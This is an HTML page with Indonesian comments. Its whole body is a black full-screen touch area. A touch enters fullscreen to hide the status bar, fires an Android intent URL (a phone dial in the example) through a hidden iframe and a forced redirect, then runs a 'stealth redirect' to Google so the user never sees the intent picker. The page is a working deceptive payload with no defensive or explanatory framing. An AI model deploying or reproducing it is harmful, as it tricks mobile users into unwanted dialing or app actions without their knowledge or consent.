<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>S Y S T E M</title>
    <style>
        body, html { 
            margin: 0; padding: 0; background: #000; 
            width: 100vw; height: 100vh; overflow: hidden;
        }
        #trigger {
            width: 100%; height: 100%; cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="trigger"></div>

<script>
    const trigger = document.getElementById('trigger');

    trigger.addEventListener('touchstart', function() {
        // 1. Masuk Fullscreen untuk menyembunyikan transisi status bar
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        }

        // 2. Target Intent (Contoh: Dial Number)
        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";

        // 3. Eksekusi via Iframe (Background Execution)
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = intentUrl;
        document.body.appendChild(iframe);

        // 4. Cadangan Pemicu (Mencoba memaksa browser)
        setTimeout(() => {
            window.location.href = intentUrl;
        }, 100);

        // 5. STEALTH REDIRECT
        // Kita paksa redirect ke Google setelah 800ms
        // Ini akan menimpa tab Firefox sehingga user tidak melihat 'popup' picker jika ada delay
        setTimeout(() => {
            if (document.exitFullscreen) {
                document.exitFullscreen();
            }
            window.location.replace("https://www.google.com");
        }, 800);
    });
</script>
</body>
</html>
